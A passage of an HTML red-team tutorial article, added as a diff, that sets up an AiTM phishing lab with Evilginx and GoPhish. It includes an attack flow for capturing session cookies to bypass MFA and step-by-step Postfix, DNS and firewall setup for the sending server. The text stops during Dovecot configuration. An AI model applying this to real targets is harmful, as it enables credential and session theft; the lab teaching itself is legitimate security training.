@@ -1,0 +1,3132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>AiTM Phishing Simulation — Evilginx + GoPhish + Roundcube | 0x1Ak4sh</title>
+    <meta name="description" content="Building a complete AiTM phishing infrastructure with Evilginx, GoPhish, Roundcube mail server, and Caddy reverse proxy on DigitalOcean. End-to-end red team phishing simulation.">
+    <meta name="robots" content="index,follow">
+    <link rel="canonical" href="https://mrakashkumar.in/articles/evilginx-gophish/">
+
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://mrakashkumar.in/articles/evilginx-gophish/">
+    <meta property="og:title" content="AiTM Phishing Simulation — Evilginx + GoPhish + Roundcube">
+    <meta property="og:description" content="Building a complete AiTM phishing infrastructure with Evilginx, GoPhish, Roundcube mail server, and Caddy reverse proxy on DigitalOcean.">
+    <meta property="og:image" content="https://mrakashkumar.in/articles/evilginx-gophish/assets/EvilginxandGoPhishLab.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="AiTM Phishing Simulation — Evilginx + GoPhish + Roundcube | 0x1Ak4sh">
+    <meta name="twitter:description" content="Building a complete AiTM phishing infrastructure with Evilginx, GoPhish, Roundcube mail server, and Caddy reverse proxy on DigitalOcean.">
+    <meta name="twitter:image" content="https://mrakashkumar.in/articles/evilginx-gophish/assets/EvilginxandGoPhishLab.png">
+
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/8d67cb621b.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="/css/article.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css">
+
+    <style>
+        .article-content figure { text-align: center; }
+        .article-content figure img {
+            display: inline-block; margin: 0 auto;
+            max-height: 700px; width: auto; max-width: 100%;
+        }
+        .article-content figure a.image-popup { display: inline-block; }
+    </style>
+</head>
+
+<body class="article-page">
+
+    <div class="reading-progress"></div>
+
+    <div id="canvas_snake" class="canvas canvas-snake" data-colorone="#0b1115" data-colortwo="#ff6b35"
+        style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.25;"></div>
+
+    <nav class="article-nav">
+        <div class="nav-left">
+            <a href="/" class="nav-back"><i class="fas fa-arrow-left"></i><span>Back</span></a>
+            <a href="/" class="nav-logo">0x1Ak4sh</a>
+        </div>
+        <div class="nav-right">
+            <button class="nav-share-btn" onclick="document.querySelector('.share-section').scrollIntoView({behavior:'smooth'})" title="Share">
+                <i class="fas fa-share-alt"></i>
+            </button>
+        </div>
+    </nav>
+
+    <section class="article-hero">
+        <div class="hero-bg" style="background-image: url('/articles/evilginx-gophish/assets/EvilginxandGoPhishLab.png'); background-color: #0d1117;"></div>
+        <div class="hero-content">
+            <div class="hero-badges">
+                <span class="badge badge-category"><i class="fas fa-fish"></i> Phishing Simulation</span>
+                <span class="badge badge-difficulty medium"><i class="fas fa-cogs"></i> Red Team</span>
+            </div>
+            <h1 class="hero-title">AiTM Phishing Simulation — Evilginx + GoPhish + Roundcube</h1>
+            <p style="color: rgba(255,255,255,0.7); font-size: 1.05rem; margin: 0.5rem 0 1rem; max-width: 680px;">
+                Building a complete adversary-in-the-middle phishing infrastructure with Evilginx, GoPhish, Roundcube mail server, and Caddy reverse proxy on DigitalOcean. Covers mail server setup, OPSEC modifications, token-gated proxying, and session replay.
+            </p>
+
+            <div class="project-stats">
+                <div class="stat-item"><i class="fas fa-server"></i> 2 DigitalOcean VPS</div>
+                <div class="stat-item"><i class="fas fa-envelope"></i> Postfix + Dovecot</div>
+                <div class="stat-item"><i class="fas fa-shield-halved"></i> Evilginx3</div>
+                <div class="stat-item"><i class="fas fa-bullhorn"></i> GoPhish</div>
+            </div>
+
+            <div class="hero-tags">
+                <a href="#" class="hero-tag">#phishing</a>
+                <a href="#" class="hero-tag">#evilginx</a>
+                <a href="#" class="hero-tag">#gophish</a>
+                <a href="#" class="hero-tag">#roundcube</a>
+                <a href="#" class="hero-tag">#caddy</a>
+                <a href="#" class="hero-tag">#redteam</a>
+            </div>
+        </div>
+    </section>
+
+    <main class="article-layout" style="position:relative;z-index:1;">
+
+        <aside class="toc-sidebar">
+            <div class="toc-title">Contents</div>
+            <ul class="toc-list">
+                <li><a href="#story">1. The Story</a></li>
+                <li><a href="#big-picture">2. How It All Works</a></li>
+                <li><a href="#part1">3. Part 1: Mail Server + GoPhish</a></li>
+                <li><a href="#part2">4. Part 2: Evilginx + Caddy</a></li>
+                <li><a href="#part3">5. Part 3: Running the Attack</a></li>
+                <li><a href="#blueteam">6. Blue Team Detection & Prevention</a></li>
+                <li><a href="#verification">7. Verification Checklist</a></li>
+                <li><a href="#troubleshooting">8. Troubleshooting Reference</a></li>
+                <li><a href="#references">9. References</a></li>
+            </ul>
+        </aside>
+
+        <article class="article-content">
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/EvilginxandGoPhishLab.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/EvilginxandGoPhishLab.png" alt="AiTM Phishing Simulation Lab">
+                </a>
+                <figcaption>Figure 1: Evilginx and GoPhish lab infrastructure overview.</figcaption>
+            </figure>
+
+            <blockquote>
+                <p><strong>Author:</strong> Akash Kumar (0x1Ak4sh)<br>
+                <strong>Domain used:</strong> apex-corp.xyz<br>
+                <strong>Stack:</strong> Postfix &middot; Dovecot &middot; Roundcube &middot; GoPhish &middot; Caddy &middot; Evilginx3<br>
+                <strong>Infrastructure:</strong> DigitalOcean (2 VPS, Ubuntu 24.04)</p>
+            </blockquote>
+
+            <hr>
+
+            <h2 id="story">1. The Story</h2>
+
+            <p>Apex Corp just finished a big cloud migration. All the on-premises servers &mdash; Active Directory, Exchange, workstations &mdash; got decommissioned and powered off. The team wiped everything and moved to Microsoft 365.</p>
+
+            <p>But they forgot one thing.</p>
+
+            <p>The Microsoft Entra ID tenant was still live. Every user account that was synced from the old Active Directory &mdash; <code>t.stark</code>, <code>h.campbell</code>, <code>homelander</code> and more &mdash; still existed in the cloud. Their passwords still worked because Password Hash Sync (PHS) was enabled before the lab was shut down.</p>
+
+            <p>An attacker who knows the domain is <code>apex-corp.xyz</code> can look this up, figure out there is still an active Microsoft tenant, and set up a phishing infrastructure targeting these orphaned cloud accounts.</p>
+
+            <p><strong>This project builds that exact infrastructure &mdash; end to end &mdash; for a phishing simulation.</strong></p>
+
+            <blockquote>
+                <p>This is a controlled simulation for educational and portfolio purposes only. All targets were accounts I owned in my own lab environment.</p>
+            </blockquote>
+
+            <hr>
+
+            <h2 id="big-picture">2. How It All Works &mdash; The Big Picture</h2>
+
+            <p>Before we get into commands, here is the full attack flow so everything makes sense as you build it.</p>
+
+            <h3>Attack Flow</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Attack Flow</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>A[GoPhish Campaign - Sends phishing email] --&gt; B[Postfix on VPS 1 - Delivers email locally]</code>
+                    <code>B --&gt; C[Roundcube Webmail - t.stark opens inbox]</code>
+                    <code>C --&gt; D[Victim clicks link in the email]</code>
+                    <code>D --&gt; E[Caddy Reverse Proxy on VPS 2 - Checks token, gates access]</code>
+                    <code>E --&gt; F[Evilginx on VPS 2 - Transparent AiTM Proxy]</code>
+                    <code>F --&gt; G[Real Microsoft Login - login.microsoftonline.com]</code>
+                    <code>G --&gt; H[User enters real Entra ID credentials]</code>
+                    <code>H --&gt; F</code>
+                    <code>F --&gt; I[Evilginx captures username + password + session cookie]</code>
+                    <code>I --&gt; J[User redirected to real Microsoft portal - Notices nothing]</code>
+                    <code>I --&gt; K[Attacker imports cookie - Logs in as t.stark - MFA bypassed]</code>
+                </div>
+            </div>
+
+            <p><strong>The key insight:</strong> Evilginx is not a fake page. It is a real-time transparent proxy. The victim sees the actual Microsoft login page &mdash; because Evilginx is fetching it from Microsoft and relaying it. The difference is that Evilginx intercepts the session cookie on the way back. That cookie is what lets you log in without a password or MFA.</p>
+
+            <hr>
+
+            <h2 id="part1">3. Part 1 &mdash; VPS 1: Mail Server + GoPhish</h2>
+
+            <h3>Step 1.1 &mdash; Provision the VPS</h3>
+
+            <p>Go to DigitalOcean and create a Droplet.</p>
+
+            <ul>
+                <li><strong>Image:</strong> Ubuntu 24.04 LTS</li>
+                <li><strong>Size:</strong> 2 vCPU, 4 GB RAM, 80 GB SSD (/month)</li>
+                <li><strong>Region:</strong> Whatever is closest to your targets</li>
+            </ul>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/ChoosingRegionandImage.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/ChoosingRegionandImage.png" alt="Choosing Region and Image">
+                </a>
+                <figcaption>Figure 2: Choosing the region and OS image for the Droplet.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/SelectingTheDropletPlan.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/SelectingTheDropletPlan.png" alt="Selecting Droplet Plan">
+                </a>
+                <figcaption>Figure 3: Selecting the Droplet plan with 2 vCPU and 4 GB RAM.</figcaption>
+            </figure>
+
+            <p>Name it mailserver and click <strong>Create Droplet</strong>.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/GivingDropletName.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/GivingDropletName.png" alt="Naming the Droplet">
+                </a>
+                <figcaption>Figure 4: Naming the droplet as mailserver.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CreateDroplet.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CreateDroplet.png" alt="Create Droplet">
+                </a>
+                <figcaption>Figure 5: Creating the Droplet.</figcaption>
+            </figure>
+
+            <p>Once it is up, you will see the dashboard with the public IP.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/DashboardofMailserverVPS.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/DashboardofMailserverVPS.png" alt="Mail Server Dashboard">
+                </a>
+                <figcaption>Figure 6: Dashboard of the mail server VPS showing the public IP.</figcaption>
+            </figure>
+
+            <p><strong>Before anything else</strong>, check that the IP is clean. Go to <a href="https://www.abuseipdb.com" target="_blank" rel="noopener">abuseipdb.com</a> and search for the IP. You want zero reports. If the IP is flagged, destroy the droplet and create a fresh one in a different region.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/AbuseIpPublicIP.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/AbuseIpPublicIP.png" alt="AbuseIPDB Check">
+                </a>
+                <figcaption>Figure 7: Checking the public IP on AbuseIPDB to confirm it is clean.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.2 &mdash; Log In and Basic Setup</h3>
+
+            <p>SSH into the server:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> ssh root@YOUR_VPS1_IP</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/loggedIntoServer.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/loggedIntoServer.png" alt="Logged into Server">
+                </a>
+                <figcaption>Figure 8: Logged into the VPS server via SSH.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt update && apt upgrade -y</code>
+                </div>
+            </div>
+
+            <p>Edit /etc/hosts and add your domain:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/hosts</code>
+                </div>
+            </div>
+
+            <p>Add this line:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/hosts</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>YOUR_VPS1_IP    mail.apex-corp.xyz mail</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 1.3 &mdash; Configure DNS in Cloudflare</h3>
+
+            <p>Add these records for your domain:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Name</th>
+                        <th>Value</th>
+                        <th>Note</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>A</td>
+                        <td>mail</td>
+                        <td>VPS 1 IP</td>
+                        <td>DNS only (grey cloud)</td>
+                    </tr>
+                    <tr>
+                        <td>MX</td>
+                        <td>apex-corp.xyz</td>
+                        <td>mail.apex-corp.xyz (priority 10)</td>
+                        <td>&mdash;</td>
+                    </tr>
+                    <tr>
+                        <td>TXT</td>
+                        <td>apex-corp.xyz</td>
+                        <td>v=spf1 a:mail.apex-corp.xyz -all</td>
+                        <td>SPF record</td>
+                    </tr>
+                    <tr>
+                        <td>TXT</td>
+                        <td>_dmarc.apex-corp.xyz</td>
+                        <td>v=DMARC1; p=none;</td>
+                        <td>DMARC record</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <blockquote>
+                <p><strong>Important:</strong> Mail-related records must be DNS only (grey cloud in Cloudflare). If you orange-cloud them, Cloudflare proxy breaks SMTP traffic.</p>
+            </blockquote>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/TypeARecordPointsToMyIP.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/TypeARecordPointsToMyIP.png" alt="A Record DNS">
+                </a>
+                <figcaption>Figure 9: A record pointing to VPS 1 IP address.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/AddingSPFRecords.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/AddingSPFRecords.png" alt="SPF Record">
+                </a>
+                <figcaption>Figure 10: Adding SPF record in Cloudflare DNS.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/AddingDMarc%20REcord.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/AddingDMarc%20REcord.png" alt="DMARC Record">
+                </a>
+                <figcaption>Figure 11: Adding DMARC record in Cloudflare DNS.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/overAllRecords.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/overAllRecords.png" alt="All DNS Records">
+                </a>
+                <figcaption>Figure 12: Overall DNS records overview in Cloudflare.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.4 &mdash; UFW Firewall</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> ufw default deny incoming</code>
+                    <code><span class="prompt">$</span> ufw default allow outgoing</code>
+                    <code><span class="prompt">$</span> ufw allow 22/tcp</code>
+                    <code><span class="prompt">$</span> ufw allow 25/tcp</code>
+                    <code><span class="prompt">$</span> ufw allow 80/tcp</code>
+                    <code><span class="prompt">$</span> ufw allow 443/tcp</code>
+                    <code><span class="prompt">$</span> ufw allow 587/tcp</code>
+                    <code><span class="prompt">$</span> ufw allow 993/tcp</code>
+                    <code><span class="prompt">$</span> ufw enable</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/UFWRules.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/UFWRules.png" alt="UFW Rules">
+                </a>
+                <figcaption>Figure 13: UFW firewall rules configured and enabled.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.5 &mdash; Get an SSL Certificate</h3>
+
+            <p>Get the SSL certificate <strong>before</strong> installing any mail services to avoid port conflicts.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install certbot -y</code>
+                    <code><span class="prompt">$</span> certbot certonly --standalone -d mail.apex-corp.xyz</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/IssuingLetsEncryptCertificate.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/IssuingLetsEncryptCertificate.png" alt="Let's Encrypt Certificate">
+                </a>
+                <figcaption>Figure 14: Issuing Let's Encrypt SSL certificate for mail.apex-corp.xyz.</figcaption>
+            </figure>
+
+            <p>Certificate files are saved to /etc/letsencrypt/live/mail.apex-corp.xyz/</p>
+
+            <hr>
+
+            <h3>Step 1.6 &mdash; Install and Configure Postfix</h3>
+
+            <p>When the installer asks, choose <strong>Internet Site</strong> and type the mail name as <code>apex-corp.xyz</code>.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install postfix -y</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/postfix-selectinternetsite.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/postfix-selectinternetsite.png" alt="Postfix Installation">
+                </a>
+                <figcaption>Figure 15: Selecting Internet Site during Postfix installation.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/writethemailnamewhileinstallingpostfix.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/writethemailnamewhileinstallingpostfix.png" alt="Postfix Mail Name">
+                </a>
+                <figcaption>Figure 16: Setting the mail name to apex-corp.xyz during Postfix installation.</figcaption>
+            </figure>
+
+            <p><strong>Create a dedicated mail user (no login shell &mdash; just for storing mail):</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> groupadd -g 5000 vmail</code>
+                    <code><span class="prompt">$</span> useradd -g vmail -u 5000 -d /var/mail/vhosts -s /usr/sbin/nologin vmail</code>
+                    <code><span class="prompt">$</span> mkdir -p /var/mail/vhosts/apex-corp.xyz</code>
+                    <code><span class="prompt">$</span> chown -R vmail:vmail /var/mail/vhosts</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/creating%20dedicated%20mail%20user%20without%20login%20shell.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/creating%20dedicated%20mail%20user%20without%20login%20shell.png" alt="Creating Mail User">
+                </a>
+                <figcaption>Figure 17: Creating a dedicated mail user without login shell.</figcaption>
+            </figure>
+
+            <p><strong>Create the virtual mailbox domain file:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/postfix/virtual_mailbox_domains</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/postfix/virtual_mailbox_domains</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>apex-corp.xyz    OK</code>
+                </div>
+            </div>
+
+            <p><strong>Create the virtual mailbox map (one mailbox per line):</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/postfix/virtual_mailbox_maps</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/postfix/virtual_mailbox_maps</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>t.stark@apex-corp.xyz           apex-corp.xyz/t.stark/</code>
+                    <code>h.campbell@apex-corp.xyz        apex-corp.xyz/h.campbell/</code>
+                    <code>homelander@apex-corp.xyz        apex-corp.xyz/homelander/</code>
+                    <code>security@apex-corp.xyz          apex-corp.xyz/security/</code>
+                    <code>it-helpdesk@apex-corp.xyz       apex-corp.xyz/it-helpdesk/</code>
+                    <code>noreply@apex-corp.xyz           apex-corp.xyz/noreply/</code>
+                </div>
+            </div>
+
+            <p><strong>Create a catch-all map (any unmatched address goes to t.stark):</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/postfix/virtual_alias_maps</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/postfix/virtual_alias_maps</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>@apex-corp.xyz    t.stark@apex-corp.xyz</code>
+                </div>
+            </div>
+
+            <p><strong>Back up the original config and replace it:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> cp /etc/postfix/main.cf /etc/postfix/main.cf.backup</code>
+                    <code><span class="prompt">$</span> nano /etc/postfix/main.cf</code>
+                </div>
+            </div>
+
+            <p>Paste this full configuration:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/postfix/main.cf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code># Postfix - apex-corp.xyz Mail Server</code>
+                    <code></code>
+                    <code># Identity</code>
+                    <code>smtpd_banner =  ESMTP</code>
+                    <code>myhostname = mail.apex-corp.xyz</code>
+                    <code>mydomain = apex-corp.xyz</code>
+                    <code>myorigin = </code>
+                    <code></code>
+                    <code># Network</code>
+                    <code>inet_interfaces = all</code>
+                    <code>inet_protocols = ipv4</code>
+                    <code>mynetworks = 127.0.0.0/8 [::1]/128</code>
+                    <code>mydestination = localhost</code>
+                    <code></code>
+                    <code># Virtual Mailbox</code>
+                    <code>virtual_mailbox_domains = hash:/etc/postfix/virtual_mailbox_domains</code>
+                    <code>virtual_mailbox_base = /var/mail/vhosts</code>
+                    <code>virtual_mailbox_maps = hash:/etc/postfix/virtual_mailbox_maps</code>
+                    <code>virtual_alias_maps = hash:/etc/postfix/virtual_alias_maps</code>
+                    <code>virtual_uid_maps = static:5000</code>
+                    <code>virtual_gid_maps = static:5000</code>
+                    <code>virtual_minimum_uid = 5000</code>
+                    <code></code>
+                    <code># TLS (Incoming)</code>
+                    <code>smtpd_tls_cert_file = /etc/letsencrypt/live/mail.apex-corp.xyz/fullchain.pem</code>
+                    <code>smtpd_tls_key_file = /etc/letsencrypt/live/mail.apex-corp.xyz/privkey.pem</code>
+                    <code>smtpd_tls_security_level = may</code>
+                    <code>smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1</code>
+                    <code>smtpd_tls_mandatory_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1</code>
+                    <code>smtpd_tls_loglevel = 1</code>
+                    <code></code>
+                    <code># TLS (Outgoing)</code>
+                    <code>smtp_tls_security_level = may</code>
+                    <code>smtp_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1</code>
+                    <code></code>
+                    <code># Relay Restrictions</code>
+                    <code>smtpd_relay_restrictions = permit_mynetworks, reject_unauth_destination</code>
+                    <code></code>
+                    <code># Anti-Abuse</code>
+                    <code>smtpd_helo_required = yes</code>
+                    <code>disable_vrfy_command = yes</code>
+                    <code>message_size_limit = 10240000</code>
+                    <code></code>
+                    <code># Rate Limiting</code>
+                    <code>smtpd_client_connection_rate_limit = 10</code>
+                    <code>smtpd_client_message_rate_limit = 30</code>
+                    <code>anvil_rate_time_unit = 60s</code>
+                    <code></code>
+                    <code># Logging</code>
+                    <code>maillog_file = /var/log/mail.log</code>
+                </div>
+            </div>
+
+            <p><strong>Generate the hash databases</strong> (Ubuntu 24.04 requires this step &mdash; files must be compiled before Postfix can use them):</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> postmap /etc/postfix/virtual_mailbox_domains</code>
+                    <code><span class="prompt">$</span> postmap /etc/postfix/virtual_mailbox_maps</code>
+                    <code><span class="prompt">$</span> postmap /etc/postfix/virtual_alias_maps</code>
+                    <code><span class="prompt">$</span> postconf compatibility_level=3.6</code>
+                </div>
+            </div>
+
+            <p><strong>Restart Postfix:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl restart postfix</code>
+                    <code><span class="prompt">$</span> systemctl enable postfix</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/StartingPostfix.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/StartingPostfix.png" alt="Starting Postfix">
+                </a>
+                <figcaption>Figure 18: Starting and enabling Postfix service.</figcaption>
+            </figure>
+
+            <p><strong>Test local mail delivery:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> echo Test body from Postfix | mail -s Postfix Test t.stark@apex-corp.xyz</code>
+                    <code><span class="prompt">$</span> ls /var/mail/vhosts/apex-corp.xyz/t.stark/new/</code>
+                    <code><span class="prompt">$</span> tail -20 /var/log/mail.log</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/SendingAndTestingLocalMail.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/SendingAndTestingLocalMail.png" alt="Testing Local Mail">
+                </a>
+                <figcaption>Figure 19: Sending and testing local mail delivery through Postfix.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.7 &mdash; Install and Configure Dovecot (IMAP)</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install dovecot-core dovecot-imapd -y</code>
+                </div>
+            </div>
+
+            <p><strong>Main config &mdash; make sure protocols line is uncommented:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/dovecot/dovecot.conf</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/dovecot/dovecot.conf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>protocols = imap</code>
+                </div>
+            </div>
+
+            <p><strong>Set the mail location:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
